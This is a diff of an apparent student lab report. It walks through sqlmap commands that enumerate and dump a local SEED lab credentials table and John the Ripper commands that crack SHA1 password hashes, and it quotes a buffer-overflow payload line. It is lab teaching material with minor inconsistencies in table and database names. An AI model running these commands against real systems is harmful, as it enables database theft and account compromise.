@@ -194,7 +194,7 @@ run $(python -c "print('a'*20 + '\x70\x91\xdc\xf7' + '\x60\xb4\xdb\xf7' + '\x13\
 ```
 
 # Task 2: Attack on the database of Vulnerable App from SQLi lab
-
+## bWAPP
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
 
@@ -265,6 +265,90 @@ sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=
 As we can see, there are 2 users, and their password is hashed (but sqlmap have decode it anyway - "bug")
 
 **Conclusion**: there are 5 tables: blog, heroes, movies, users, visitors; and 2 users in the users table
+
+**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+**Answer 3**:
+
+First, install John the Ripper:
+
+```
+sudo apt-get install john
+```
+
+The passwords are the same for 2 users. And it used SHA1 format to encrypt (40 characters).
+
+Then we will be able to use john to reveal the password:
+
+1. Write the hashes into hash.txt:
+
+```
+nano ./hash.txt
+```
+
+![alt text](/img/nano.png)
+
+2. Use John:
+
+```
+john --format=raw-sha1 --wordlist=/home/kali/Downloads/rockyou.txt /hash.txt
+```
+
+The result is:
+![alt text](/img/pwd.png)
+
+**Conclusion**: The password for both users is "bug"
+
+
+## Seed lab
+**Question 1**: Use sqlmap to get information about all available databases
+**Answer 1**:
+
+The Seed lab web app:
+![image](https://github.com/user-attachments/assets/b4f90c7b-9f44-4b23-a4d5-72689ea7551e)
+
+### Get all information about databases:
+
+Craft the sqlmap command:
+
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=alice&Password=seedalice" --dbs
+```
+
+- --dbs: Tells sqlmap to retrieve the available databases.
+
+After a few minutes, the result is
+![image](https://github.com/user-attachments/assets/077c3d01-a636-4683-91ff-18d0aa246a2d)
+
+**Conclusion**: There are 2 available databases: information_schema and sqllab_users 
+
+**Question 2**: Use sqlmap to get tables, users information
+**Answer 2**:
+
+To get tables in the database named `bWAPP`, we use
+
+```
+ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=alice&Password=seedalice" -D sqllab_users --tables
+```
+
+-   --tables: Lists all tables in the specified database.
+
+![image](https://github.com/user-attachments/assets/5c0055f1-738a-46a4-ba1d-e34eb54536e2)
+
+There is 1 table: credentials
+
+And to get user information, we will exploit the `credentials` talbes:
+
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=alice&Password=seedalice" -D sqllab_users -T credential --dump
+```
+
+-   -T credential: Specifies the credential table.
+-   --dump: Dumps the entire content of the table.
+
+![image](https://github.com/user-attachments/assets/0c011e3b-07c6-4278-84c0-de52f87bcf39)
+
+
+**Conclusion**: there are 1 table named credential
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
